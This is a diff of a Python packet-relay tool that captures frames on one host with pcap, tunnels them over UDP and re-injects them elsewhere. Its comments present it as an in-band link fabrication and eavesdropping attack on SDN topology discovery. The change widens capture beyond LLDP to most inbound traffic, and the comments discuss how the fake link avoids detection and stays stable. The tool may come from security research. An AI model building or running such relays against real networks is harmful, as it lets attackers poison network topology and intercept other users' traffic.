@@ -1,6 +1,8 @@
 import pcap
-import time
-import socket 
+import dpkt
+import socket
+import psutil 
+import time 
 from optparse import OptionParser
 
 class LLDPRelayClient(object):
@@ -12,26 +14,41 @@ class LLDPRelayClient(object):
         self.bind_iface = bind_iface 
         self.relay_addr = relay_addr
         self.relay_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
+        self.local_mac = self._query_mac(bind_iface)
+        print(self.local_mac)
+    
+    def _query_mac(self, iface):
+        addr_dict = psutil.net_if_addrs()    
+        if iface not in addr_dict:
+            return '00:00:00:00:00:00' 
+        for snic_addr in addr_dict[iface]:
+            if snic_addr.family.name == 'AF_PACKET':
+                return snic_addr.address
+        return '00:00:00:00:00:00' 
+            
     def _init_pcap(self):
-       return pcap.pcap(self.bind_iface, promisc=True, immediate=True, timeout_ms=50)
-
-    # Since we only focus on LLDP packets, thus ignore other packets here.
-    # In reality, to further raise eavesdropping attack, all the packets should 
-    # be forwarded (relayed). However, the function can be realized in other modules.
-    def _filter_lldp(self, pcap_handler):
-        pcap_handler.setfilter('ether proto 0x88cc')
+        pcap_handler = pcap.pcap(self.bind_iface, promisc=False, immediate=True, timeout_ms=50)
+        filter_strategy = 'inbound and \
+                (ether proto 0x88cc or \
+                (not ether dst host ff:ff:ff:ff:ff:ff and \
+                 not ether src host 00:00:de:ad:be:ef))' 
+        pcap_handler.setfilter(filter_strategy)
+        return pcap_handler
     
     def _loop_capture(self, pcap_handler):
         for ptime, pdata in pcap_handler:
+            eth = dpkt.ethernet.Ethernet(pdata)
+            dst_mac = eth.dst
+            str_dst_mac = ':'.join(['{:02x}'.format(n) for n in dst_mac])
+            if str_dst_mac == self.local_mac:
+                continue
             self.relay_sock.sendto(pdata, self.relay_addr)
-            delta_time = time.time() - ptime 
-            print(f'capturing delay {delta_time}')
+            # delta_time = time.time() - ptime 
+            # print(f'capturing delay {delta_time}')
 
     def run(self):
         try:
             pcap_handler = self._init_pcap()
-            self._filter_lldp(pcap_handler)
             self._loop_capture(pcap_handler)
         except KeyboardInterrupt:
             return 
@@ -46,7 +63,7 @@ class LLDPRelayServer(object):
         self.bind_addr = bind_addr
         self.bind_iface = bind_iface
         self.recv_sock = self._init_recv_sock()
-        self.send_sock = self._init_send_sock()
+        self.pcap_handler = self._init_pcap()
         
     def _init_recv_sock(self):
         try:
@@ -59,35 +76,29 @@ class LLDPRelayServer(object):
             print('[+] recv sock is successfully initialized.')
             return sock
 
-    def _init_send_sock(self):
-        try:
-            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-            sock.bind((self.bind_iface, 0))
-        except socket.error as e:
-            print(e)
-            return None 
-        else:
-            print('[+] send sock is successfully initialized.')
-            return sock
+    def _init_pcap(self):
+        return pcap.pcap(self.bind_iface, promisc=False, immediate=True, timeout_ms=50)
 
     def _process(self):
         recv_data, recv_addr = self.recv_sock.recvfrom(65535)
         recv_size = len(recv_data)
         print(f'recved from {recv_addr}: {recv_size} bytes.')
-        self.send_sock.send(recv_data)
+        # NOTE: 
+        # 1. In-band LFA is not robust, because the mac or ip address of relayed hosts
+        # and relayed packets are inconsistent, which makes it easy to be detected. In 
+        # addition, the inconsistency makes fake link unstable, because each time the flow entry
+        # is timeout, the in-band channel would be disrrupted. At this event, if the flow entry is
+        # updated with the relayed packets, the in-band channel would be closed, because relayed 
+        # hosts are disconnected. 
+        # 2. Therefore, to collect the link delay of in-band channel, we must set idle_timeout value.
+        self.pcap_handler.sendpacket(recv_data)
 
     def run(self):
-        is_init_ok = self.send_sock and self.recv_sock
-        is_stop = False if is_init_ok else True 
-        while not is_stop:
+        while True:
             try:
                 self._process()
             except KeyboardInterrupt as e:
-                is_stop = True 
-                print(e)
-            except socket.error as e:
-                is_stop = True 
-                print(e)
+                break
         
 if __name__ == '__main__':
     prompt = '''usage: %prog -t [c|s] -i iface -a ip -p port.'''
